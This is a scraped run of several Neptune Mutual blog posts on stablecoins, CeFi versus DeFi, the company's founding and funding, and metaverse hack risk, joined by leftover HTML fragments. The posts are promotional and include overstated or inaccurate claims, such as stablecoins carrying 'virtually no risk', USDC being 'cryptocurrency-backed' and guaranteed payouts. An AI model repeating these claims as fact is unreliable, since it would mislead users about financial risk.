experiencing fast-paced progress and change. It’s a promising market full of innovation, and opportunity.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

They are an independent cryptocurrency and they keep financial data private.</p><h2 id="common-use-cases-of-stablecoins">Common use cases of stablecoins</h2><h3 id="volatility-reduction">Volatility reduction.</h3><p>Because of their stable nature, stablecoins provide a safe haven for crypto investors to “park” their crypto investments in an asset where there is virtually no risk of price volatility.</p><h3 id="trade-and-store-with-ease">Trade and store with ease.</h3><p>Stablecoins are “mobile” assets. They’re easy to transfer and store in a hot or cold wallet that doesn’t have the same constraints as a bank account. Investors and owners can send stablecoin anywhere around the world without having the need to convert it into local currency.</p><h3 id="cheaper-fund-transfers">Cheaper fund transfers.</h3><p>Transfer fees for sending stablecoin are significantly less than for fiat currency. Because of its ability to keep its price anchored, cryptocurrency owners and investors may prefer using stablecoins for fund transfers and trades over traditional fiat currency exchange.</p><h3 id="lending">Lending</h3><p>Another popular use of stablecoins is lending. It’s an interesting opportunity for investors because it can offer two-digit interest rates, but without incurring the price volatility associated with traditional cryptocurrencies.</p><h3 id="defi-insurance">DeFi insurance</h3><p>Stablecoins are likely to have a key role in DeFi insurance. They are used in smart contracts that guarantee liquidity and provide cover when a policyholder gets exposed to cryptocurrency risks and security issues.</p><h2 id="tether-busd-dai-and-other-popular-stablecoins">Tether, BUSD, DAI and other popular stablecoins</h2><h3 id="tether">Tether</h3><p>Tether is a popular stablecoin because of its ability to stay as valuable as the US dollar. It was designed to follow very closely the value of the USD. Bitfinex-owned Tether Limited claims they reserve 1 USD with every Tether they have in circulation.</p><h3 id="binance-usd">Binance USD</h3><p>BUSD is another stablecoin that is also pegged to the USD. One of the stablecoin’s founders, Paxos, holds an amount of US dollars equal to the total supply of Binance USD.</p><h3 id="dai">Dai</h3><p>Similar to USDT or USDC, Dai is a stablecoin whose price is pegged to the USD. It’s based on Ethereum and backed up by a variety of other cryptocurrencies. The maker protocol and the makerDAO decentralized autonomous organization oversee its issuance and development.</p><h3 id="usd-coin">USD Coin</h3><p>The USDC coin is backed by the dollar and runs on a variety of blockchains, including Algorand, Ethereum, and Solana, to mention a few. It’s also a cryptocurrency-backed stablecoin. Its fund reserves are held at FDIC-insured institutions in the United States.</p><h2 id="how-to-choose-and-buy-stablecoins">How to choose and buy stablecoins</h2><h3 id="1-choose-your-stablecoin">1) Choose your stablecoin.</h3><p>Begin by taking a look at the stablecoin of your choice.</p><p>It is important to research the collateral that backs your preferred stablecoin. Understand how the systems that run these stablecoins maintain their promised stability. Do your own research and ask questions that answer what happens if the stablecoin’s price mechanism, collateral system, or security goes wrong.</p><p>Are their systems secure? Are you confident they have the collateral to keep their stablecoin “stable”? Can anything wrong happen to your funds if stored in this stablecoin?</p><p>Purchase stablecoins only if you feel secure and confident it can stay stable over time and under unfavorable circumstances.</p><p>The majority of these stablecoins are backed by the US dollar but there are also stablecoins backed by gold or even other cryptocurrencies.</p><h3 id="2-sign-up-with-your-chosen-crypto-exchange">2) Sign up with your chosen crypto exchange.</h3><p>Choose an exchange that sells your preferred stablecoin or whichever stablecoin it offers, if that’s okay with you.</p><p>Register with either a centralized or decentralized cryptocurrency exchange of your choice. The specific registration procedure varies slightly on each exchange, although it is usually simple.</p><p>There is an identity verification process that takes place either during or after you create an account. This is necessary for exchanges to ensure that accounts aren’t being used for illicit purposes and to meet tax reporting requirements.</p><h3 id="3-deposit-money-in-your-chosen-exchange">3) Deposit money in your chosen exchange.</h3><p>Add funds to your exchange account to purchase cryptocurrencies and stablecoins.</p><p>A transfer from your bank account is the most suggested method. Use the account number and routing number to add your bank account as a funding source. Then transfer the desired amount. All of this is possible thanks to the crypto exchange.</p><p>Keep in mind that the transfer may take several business days to complete. Because crypto exchanges can trigger banks’ fraud detection, you may additionally need to get your bank to authorise the transaction.</p><p>Many exchanges allow you to buy cryptocurrency with debit cards, credit cards, or PayPal. These methods, however, nearly invariably come with additional costs.</p><h3 id="4-buy-your-preferred-stablecoins">4) Buy your preferred stablecoins.</h3><p>Select the option to purchase cryptocurrency.</p><p>Choose the stablecoin you want to use and the amount you want to spend. A transaction preview will display the fees, total cost, and amount of stablecoin you will receive. Confirm the purchase when you’re ready.</p><p>That’s all there is to it. Buying stablecoins normally takes only a few minutes, so you should have yours in no time. After that, you’re free to do whatever you want with your stablecoins, including lending them, transferring them to others, and storing them in a crypto wallet.</p><h2 id="can-the-future-of-money-be-stablecoin">Can the future of money be stablecoin?</h2><p>Stablecoins offer huge benefits over fiats such as lower costs, safety, and real-time use.</p><p>In comparison to what consumers and businesses are used to, they also offer more competitive payment options.</p><p>They might make it easier for governments to administer conditional cash transfer programs and make it cheaper for businesses to receive payments.</p><p>They have the potential to bring unbanked or underbanked people into the financial system.</p><p>In an extremely volatile market, having a digital asset that has no more price volatility than the USD is a valuable tool for investors to use in the crypto environment.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p></p><h2 id="centralized-finance-cefi">Centralized Finance (CeFi)</h2><p>CeFi or Centralized Finance is a system of cryptocurrency trading managed by central exchanges. It’s run by fund managers and professionals that work on the development and operational processes of these exchanges.</p><p>When you trade on a centralized exchange you are bound by the rules imposed by the exchange. As a CeFi user, you can only trade cryptocurrencies available on their platform and transact with fees offered by the exchange. Also, you will only have limited access to what goes on with your wallet.</p><p>Every transfer, purchase, and/or sale you make will undergo strict processes that ensure authenticity and security. If anything wrong happens to your wallet such as crypto exploits or heists, these exchanges will be held accountable for replacement.</p><h3 id="examples-of-cefi">Examples of CeFi:</h3><p><strong><strong>Binance</strong></strong><br>It is a cryptocurrency exchange that allows users to trade, borrow, lend, pay, and transfer cryptocurrencies. It primarily offers lower fees, comprehensive chart options, and more than 500+ cryptocurrencies available for trading. They offer limit orders, market orders, P2P trading, and margin trading among many other transactions.</p><p><strong><strong>Coinbase</strong></strong><br>Just like Binance, Coinbase offers similar cryptocurrency services. They differentiate themselves for being a beginner-friendly platform with an accompanying digital wallet you can make easy PayPal withdrawals on. Unlike Binance, their platform may cost more per trade and offer less cryptocurrencies.</p><p><strong><strong>BlockFi</strong></strong><br>Also another exchange that offers fiat borrowing and lending. BlockFi lets its users leverage their cryptocurrencies. It’s focused on giving users a way of earning interest on their holdings and lending funds.</p><h2 id="decentralized-finance-defi">Decentralized Finance (DeFi)</h2><p>Exchanges don’t make the rules in decentralized finance. Automated programs developed on the blockchain control the entire processes of DeFi.</p><p>Decentralized finance aims to create a fair financial system in which everyone can take part. Even individuals without a bank account can use blockchain technology and DeFi..</p><p>In essence, DeFi aspires to build a permissionless, open-source, and transparent financial services ecosystem where anyone can participate in crypto lending, borrowing, yield farming, asset storage, and other services that are available through this decentralized financial system.</p><p>The capacity to maintain control over your assets is the main advantage of decentralized finance over centralized finance. This means you own the wallet’s key pair and are the only one who has control over your own money. Furthermore, users who wish to engage in DeFi must do so using decentralized applications (DApps) created on top of blockchain platforms.</p><h3 id="real-life-examples-of-defi">Real-life examples of DeFi:</h3><p><strong><strong>MakerDAO</strong></strong><br>A stablecoin minting and lending platform that provides loans with predetermined interest rates.</p><p>Borrowers deposit Ethereum funds in a Maker smart contract. This smart contract makes a CDP or Collateralized Debt Position. Users receive interest based on the appreciation and depreciation of the digital assets they trade on.</p><p><strong><strong>Uniswap</strong></strong><br>An open-source decentralized crypto trading protocol that cultivates a network of DeFi apps. It trades and provides liquidity for ERC20 tokens. Developed by Uniswap Labs, the protocol was built for DeFi developers and traders.</p><p><strong><strong>Polygon</strong></strong><br>A protocol building and connecting Ethereum-compatible blockchain networks.</p><p><strong><strong>Neptune Mutual</strong></strong><br>Built with transparency in mind, Neptune Mutual is a DeFi insurance parametric-based cover protocol. Intended to protect user profits and reduce risk exposure. It provides guaranteed stablecoin liquidity through hedging capital risks and smart contract exploits.</p><h2 id="what-key-features-set-defi-and-cefi-apart">What Key Features Set DeFi and CeFi Apart?</h2><p>Centralized finance is managed through exchanges while decentralized finance is technology-dependent.</p><p>Despite the fact that DeFi and CeFi have numerous distinctions, the question remains whether customers should trust technology or people.</p><p>Users of DeFi have faith in the technology’s ability to carry out the services they need. However, CeFi users trust a company’s employees to manage finances and provide those services.</p><h3 id="cefi">CeFi</h3><p><strong><strong>Centralized exchanges</strong></strong><br>Users deposit funds to a standard cryptocurrency exchange, such as Binance and Coinbase. These exchanges manage those deposit funds in an internal account. Users have limited control over funds stored on the exchange and will need permissions to make transactions.</p><p>Centralized exchanges have also been the subject of a number of security breaches. Given the sense of comfort centralized exchange users experience on CeFi platforms, they often reveal personal information and place funds in the custody of these organizations.</p><p><strong><strong>Fiat conversion</strong></strong><br>When converting cash to cryptocurrency and vice versa, centralized services offer more flexibility than decentralized services. Converting cryptocurrency to fiat normally necessitates the use of a centralized organization; yet, DeFi services do not provide fiat in a flexible manner.</p><p><strong><strong>Cross-chain services</strong></strong><br>Trading of BTC, XRP, LTC, and other coins issued on separate blockchain systems are supported by CeFi . DeFi services do not support these coins due to the latency and complexity of completing cross-chain exchanges. CeFi can solve this problem by obtaining custody of funds from several blockchains. Many of the most often traded and highest-market-cap coins exist on separate blockchains and do not follow interoperability standards, making this a huge benefit for CeFi.</p><h3 id="defi">DeFi</h3><p><strong><strong>Permissionless</strong></strong><br>Users do not need permission to use DeFi. To use CeFi’s services, consumers must first undergo a KYC process, which requires them to give personal information or make a financial deposit.</p><p><strong><strong>Trustless</strong></strong><br>The biggest advantage of using DeFi services is that you don’t have to trust that they’ll work as advertised. Users can verify that DeFi services work as expected by auditing their code and using external tools like Etherscan to see if a transaction was completed appropriately.</p><p><strong><strong>Innovative</strong></strong><br>Another notable benefit of DeFi is its rapid rate of innovation. The DeFi space has evolved from a build-centric environment to a diverse ecosystem with ground-breaking financial services. DeFi space has been working to give alternate approaches to handle the issue in functionalities where centralized financial services have developed.</p><h2 id="which-%E2%80%9Cfi%E2%80%9D-system-is-better">Which “Fi” System is Better?</h2><p>CeFi and DeFi seek to accomplish the same goal.</p><p>They want to popularize cryptocurrency trading and increase trading volume. However, the manner in which these two achieve their goals differs.</p><p><strong><strong>Centralized finance</strong></strong> works by establishing trust along the way. It promises security of funds as well as fair trade on those funds. It also has a wider range of fiat-crypto-fiat conversions. Crypto trading is also available to investors who possess traditional currencies.</p><blockquote><em><em>On the other hand, <strong><strong>decentralized finance</strong></strong> wants to keep the market free of the constraints of regulation. It gives investors a place to put their strategy into action without having to deal with a middleman.</em></em></blockquote><p>Privacy, autonomy, and transparency are key features for DeFi. Decentralized finance is a more user-centric financial system compared to CeFi.</p><p>It’s definitely the better “Fi” if having more control over your funds and digital assets is a must-have for you.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>Neptune Mutual is the brainchild of <a href="https://www.linkedin.com/in/binodnirvan/" rel="nofollow noopener noreferrer">Binod Nirvan</a>. The journey from nought-to-Neptune started with the notion that there was a disconnect between one of the underlying attributes of blockchain, security, and one of the most important developments in blockchain, namely smart contracts, that brings the power of programming to crypto transactions. The disconnect relates to the fact that whilst blockchain technology remains eminently secure, the use of smart contracts often leaves a range of opportunities open for criminals to hack and exploit these contracts.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/nought-to-neptune-disconnect.jpeg" class="kg-image" alt="" loading="lazy" width="1400" height="932" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/nought-to-neptune-disconnect.jpeg 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/nought-to-neptune-disconnect.jpeg 1000w, https://blog.neptunemutual.com/content/images/2022/07/nought-to-neptune-disconnect.jpeg 1400w" sizes="(min-width: 720px) 720px"></figure><p>In addition to this disconnect, as the market for cryptocurrencies grows with the increasing adoption by mainstream institutions, so the need for mainstream style tools for protection, such as insurance and financial hedging, increases.</p><p>With this in mind, Binod starting crafting a new architecture for on-chain financial cover driven by four underlying principles that were applied rigorously across all aspects of the new design:</p><ol><li>Security</li><li>Minimise risk</li><li>Scalability</li><li>User Experience (UX)</li></ol><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/nought-to-neptune-contract.jpeg" class="kg-image" alt="" loading="lazy" width="1400" height="932" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/nought-to-neptune-contract.jpeg 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/nought-to-neptune-contract.jpeg 1000w, https://blog.neptunemutual.com/content/images/2022/07/nought-to-neptune-contract.jpeg 1400w" sizes="(min-width: 720px) 720px"></figure><p>One of the challenges of traditional insurance is the mis-match in understanding, between the insured and the insurer, about what is, and is not, covered by the insurance policy. If ever there was an industry where “read the small print” was considered a universal axiom, it is the insurance industry … and for good reason. A surefire recipe for all-round dissatisfaction is a crypto hack, followed by an announcement from the insurer that the policyholders will not be able to claim a payout because the type of hack/exploit was not covered by the terms of the policy. The challenge of protecting consumers and corporations in a digital environment against a wide range of highly technical scenarios just adds a whole extra layer of complexity to this mis-match in understanding.</p><blockquote><em><em>The parametric cover architecture adopted by Binod not only provides an elegant path through the challenge of defining and understanding the scope of protection, but also lends itself to meeting the four design principles adopted by Neptune Mutual.</em></em></blockquote><p>After designing the Neptune Mutual architecture and preparing some plans (including no small amount of Github repository), Binod set about forming a team to turn plans into action: Edward Ryall joined in mid-2021, shortly followed by Gillian WU. Edward brought with him experience of financing and operating startups, and Gillian brought her knowledge and network of the digital asset industry gained through her role as CEO of Huobi Asset Management.</p><p><strong><strong><em><em>Together the team set about raising funds to get from nought to somewhere. By the end of October a 1.75m USD Seed round had been closed with an impressive array of diverse investors, led by the renowned Fenbushi Capital and including one of the world’s most familiar names in crypto, Coinbase Ventures. The momentum of this success immediately carried forward into a subsequent strategic round where again, new and exciting opportunities opened up for Neptune Mutual. This time the round was led by Animoca Brands, as the vision of Neptune Mutual’s cover protection was found to be an ideal fit with the goal of protecting virtual assets in the metaverse.</em></em></strong></strong></p><p>During the course of November and December, financial resources were used to recruit human resources. In the space of just under two months Neptune Mutual has been transformed from code to community. The team is diverse and vibrant, willing and hungry to make a difference. Nearly 20 individuals have landed on Neptune, arriving from India, Hong Kong, the Philippines, Nepal, the UK, France, and Holland; all with one aim, to provide the best possible protection against crypto market risks.</p><p>So if 2021 was from nought to Neptune, what does 2022 hold in store? The collective will of the team is to build a successful future for Neptune Mutual and our Neptunian ecosystem (… and obviously go to its 14 moons!) … based on our four principles: security, minimise risk, scalability and UX. What a privilege to take on this challenge with the Neptune team.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>I don’t have a VR headset and I still haven’t bought my NFT avatar yet so why should I care? Well, as someone who raises funds for my own startups (<a href="http://www.ave-chimera.com/" rel="nofollow noopener noreferrer">ave-chimera.com</a>), leads fund-raising activity for fellow entrepreneurs (<a href="https://www.qameleon.fr/" rel="nofollow noopener noreferrer">Qameleon.fr</a>), and manages investments for my own family office into deep tech startups (deeply risky) (<a href="https://www.ryallenergy.com/" rel="nofollow noopener noreferrer">ryallenergy.com</a>) , I can assure you that it is never too early to learn about mitigating risk. Risk is all about opportunities and threats, real and virtual, success and failure, yin and yang. If you are interested in digital assets, digital success, and how to navigate the Metaverse, then the corollary is that you have an interest in mitigating risk. Mitigating risk is the underlying reason for my involvement as co-founder of <a href="https://neptunemutual.com/" rel="follow">Neptune Mutual</a>.</p><h2 id="meta-criminals">Meta Criminals</h2><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/meta-criminal.jpeg" class="kg-image" alt="" loading="lazy" width="1400" height="787" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/meta-criminal.jpeg 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/meta-criminal.jpeg 1000w, https://blog.neptunemutual.com/content/images/2022/07/meta-criminal.jpeg 1400w" sizes="(min-width: 720px) 720px"></figure><p>We all know that there is a growing appetite for creating digital assets in the Metaverse, and that these assets have both tangible and intangible value (…brand, image etc.). We also know that whilst blockchain offers many advantages in terms of security, the rise in the use of smart contracts opens up opportunities for embedding code within these contracts that can be used for illicit and illegal activity, or so-called exploits.</p><p>In our everyday Universe we read about cyber criminal hacks and exploits on a regular basis; the most recent being <a href="https://badger.com/" rel="nofollow noopener noreferrer">Badger DAO</a> that suffered a 120m USD exploit. It seems reasonable to expect, with all the money pouring into Metaverse projects, that cyber criminals will be attracted into this space; one might call them Metacriminals. We should expect our carefully chosen avatar identity to be at risk to Metacriminals, not to mention our portfolio of virtual property, tokens and our other Metaverse assets.</p><h2 id="cyber-crime">Cyber Crime</h2><p>Digital assets are often held by customers that do not want to be identified; combine this with the challenges of demonstrating a loss and the assessment of claims, and you can quickly see that the use of traditional discretionary insurance is both inefficient and unreliable. Add to this the difficulty of defining and communicating what is, and is not, covered by an insurance policy, and you have a recipe for a lot of upset insurance policy holders, hit by the double whammy of loss from a protocol exploit, followed by the realisation that the heavy insurance premiums they had been paying to cover such a circumstance are not going to pay-out to cover their loss.</p><p>Referring to the Badger DAO hack and the reaction of the protocol insurer, Stephen Palley, a partner at the law firm Anderson Kill tweeted:</p><p><em><em>As someone who spent years suing insurance companies when they failed to pay valid claims, color me shocked, absolutely shocked, that insurance ‘on the blockchain’ is the same old story,”</em></em></p><p><a href="https://neptunemutual.com/" rel="follow">Neptune Mutual</a> is a startup that is proposing an alternative solution to financial protection against hacks and exploits. Unlike traditional insurance which requires a customer to have suffered a loss to an asset, and then make an individual claim which is then assessed, Neptune Mutual is developing a de-centralised parametric cover platform. With parametric cover, individuals or entities that purchase cover do not need to identify themselves through a KYC process, and they do not need to hold an asset or suffer a loss, and, most importantly, they do not need to make an individual claim in the event of an incident. One can think of parametric cover like a hedging instrument, although in the first version of Neptune Mutual’s platform the principal risks covered will be technical as opposed to financial, that is to say risks of hacks and exploits as opposed to risks associated with price movements or other financial risk.</p><p>The nature of parametric cover, including the avoidance of a claims assessment process, make it a scalable and reliable solution for protecting digital assets. For this reason, Neptune Mutual is attracting interest as a solution to protect against Metacrimes.</p><h2 id="metacrime">Metacrime</h2><p>Companies are already investing heavily in Meta Assets. Adidas, for example, has just spent over 200k USD on Bored Ape Yacht Club #8774, Indigo Hertz.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/adidas-bayc-8774.png" class="kg-image" alt="" loading="lazy" width="800" height="500" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/adidas-bayc-8774.png 600w, https://blog.neptunemutual.com/content/images/2022/07/adidas-bayc-8774.png 800w" sizes="(min-width: 720px) 720px"></figure><p>Investing in static NFTs is just the very start for companies looking to shape their Metaverse brand image. <a href="https://alethea.ai/" rel="nofollow noopener noreferrer">Athlea AI</a>, backed by Mark Cuban, is a company that envisions smart NFTs that can converse and become progressively more intelligent through the use of data analytics and AI. A number of NFT avatars are minted with smart contracts that provide their holders with special access rights to virtual clubhouses.</p><p>But what if your smart avatar has had its contracts audited? No need to bother with paying for policies to protect against hacks, right? Well, that would be nice, particularly given the cost of smart contract auditing, but unfortunately recent history suggests that smart contract auditing has its limits. <a href="https://www.certik.com/" rel="nofollow noopener noreferrer">CertiK</a> is a leading smart contract audit firm and just raised 80m USD in a Series B2 round at a valuation of nearly 1 billion USD. There are a growing number of examples of protocols, such as bZx and Lien finance that have been audited by well-known audit firms, but that have, none-the-less, suffered from hacks and exploits. bZx suffered from three different attacks in 2020, the first two involved the use of external protocols whilst the third attack took advantage of an internal protocol flaw causing a loss of 8m USD. Examples such as these suggest that smart contract audits are insufficient, by themselves, to protect your protocol or the assets of your customers.</p><p>As NFTs progress in sophistication, it is likely that opportunities for exploits will grow, and we will no doubt see a range of apes, avastars, cats, rats, ducks, and punks being held to ransom in a wave of Metacrime.</p><h3 id="there%E2%80%99s-more-at-stake-than-your-intelligent-ape">There’s More at Stake than your Intelligent Ape</h3><p>….really?<br>…. er yes … like your customers?<br>An outage blacks-out the virtual world in which your company is active, and your customers’ accounts get emptied; some of them may have chosen to take out parametric cover to protect themselves against this type of event, others may not. What is your contingency plan to restore your customers’ confidence in your brand? Your reputation will be made, or lost, based on what you do to support your customers when their metaworld collapses.</p><p>Creating your own cover pool with Neptune Mutual allows you to attract liquidity that can be used to cover both your customers, and your company, should a hack or exploit arise. Once the community has validated that an incident has occured, all cover policyholders are paid without exception: no claims assessment, no discretion, no discrimination and no delay.</p><p>Of course the Metaverse will be a multitude of Metaworlds, and this means your Intelligent Ape could be travelling to different worlds across different blockchain protocols: one minute exploring space in<a href="https://staratlas.com/" rel="nofollow noopener noreferrer"> Star Atlas</a> (on the Solana blockchain), and the next minute, buying a property in <a href="https://www.sandbox.game/en/" rel="nofollow noopener noreferrer">The Sandbox</a>, a virtual world backed by Softbank, running on the Ethereum blockchain.</p><p>In this context, how do you protect against risks associated with hacks and exploits when your avatar is literally walking across bridges from one blockchain world to another? This is where the underlying flexibility of the cross-chain solution proposed by Neptune Mutual aligns to the open cross-chain nature of Metaverse. Cover protection is created in dedicated cover pools for specific projects (and blockchains), and in this way it is possible both to ring-fence the different risks associated with different projects and blockchains, whilst policy holders have the option of creating a combination of cover policies to meet the different metaworld projects they are exposed to.</p><h2 id="metassurance">Metassurance</h2><p>So where does one go in the Metaverse to get financial protection against the risks of hacks and exploits? Neptune Mutual is already working with Metaverse partners to embed its cover protection solution directly into Metaworlds. Back in our Universe in the context of CeFi and DeFi, Neptune Mutual’s solution is already being embedded directly into exchange, custodian and other Neptune Mutual cover partners’ websites using the Neptune Mutual SDK. This white label solution allows Neptune Mutual partners to create their own parametric cover liquidity pools, bootstrap liquidity for these cover pools from within their own community of users, and use this liquidity to provide financial protection to those in the community who take out cover policies directly from the partner website. Cover Creators can both provide liquidity to cover pools as well as take out their own cover policies to provide capital in the event of an incident; this payout could be used to mitigate losses incurred by its clients.</p><p>Corporate entities work in a world in which the rules are familiar: IFRS, GRPD, Copyright, SEC/FCA/ESMA, and of course KYC and AML. So how are you going to explain to your company accountants and auditors that you are buying virtual digital assets … with tokens? Boards of Directors govern corporations by taking measured risks. So when you take that step of proposing a marketing strategy to enter the rather unfamiliar space of Metaverse, you should expect the “what if” questions that will surely follow. It is undeniable that Metaverse represents new opportunities, but your Board of Directors will recognise the corresponding risks and want concrete plans to mitigate them. Finding guaranteed methods of protecting your corporates’ virtual assets will be key to building confidence both internally and externally in real world blockchain projects as well as virtual Metaverse projects.</p><p>In unfamiliar territory it is important to protect your interests. Paying for protection is easy, but understanding what protection you are actually covered for can be less obvious, as many Badger token owners have discovered as previously mentioned. Neptune Mutual’s parametric cover provides guaranteed pay-out for all cover policy holders in the event that an exploit or hack is validated by the community. In a Metaverse full of risks, guarantees are hard to come by.</p><p>So Metaverse may look good, but when things turn bad and ugly, there’s no sheriff to run to. Make no mistake, for corporations, the Metaverse is the Wild West. As a certain Clint Eastwood once [nearly] said:</p><p>‘<em><em>If you want a guarantee, buy a toaster … [or Neptune Mutual cover]</em></em>.’</p><p>So the Metaverse is the Wild West, you have armed yourself with Neptune Mutual parametric cover. You are ready for anything … you know you want to say it:</p><p><em><em>“… go ahead CyberPunk, make my day”.</em></em></p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.
